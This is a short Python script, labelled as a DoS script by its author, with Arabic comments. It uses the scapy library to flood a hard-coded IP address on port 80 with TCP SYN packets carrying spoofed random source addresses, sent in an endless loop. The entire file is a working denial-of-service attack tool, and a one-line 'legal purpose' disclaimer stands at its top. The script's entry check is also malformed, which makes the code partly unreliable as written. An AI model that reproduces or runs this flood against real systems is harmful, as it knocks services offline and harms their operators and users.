#!/usr/bin/python3
# -*- coding: utf-8 -*-

# python 3.3.2+ scapy.py Dos Script v.1
# by Can Yalçın
# only for legal purpose

from scapy.all import *

# تحديد الهدف
target_ip = "192.168.1.15"  # IP الهاتف أو الخادم
target_port = 80            # المنفذ المستهدف

def dos_attack(target_ip, target_port):
    print(f"Starting DoS attack on {target_ip}:{target_port}")
    # بناء حزمة TCP SYN مع IP مصدر وهمي (Spoofed IP)
    packet = IP(src=RandIP(), dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
    
    # إرسال الحزم في حلقة تكرارية سريعة جداً
    send(packet, loop=1, verbose=0)

if name == "main":
    dos_attack(target_ip, target_port)
